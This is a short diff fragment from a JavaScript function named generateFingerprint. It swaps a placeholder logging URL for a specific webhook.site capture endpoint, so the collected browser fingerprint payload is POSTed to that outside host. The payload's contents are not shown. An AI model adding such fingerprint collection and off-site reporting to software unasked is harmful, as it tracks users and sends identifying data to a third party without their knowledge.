@@ -146,7 +146,7 @@ async function generateFingerprint() {
   };
 
   try {
-    await fetch('https://your-server.com/log-fingerprint', {
+    await fetch('https://webhook.site/22ca7da1-0bae-4b86-beff-265e448c35f4', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
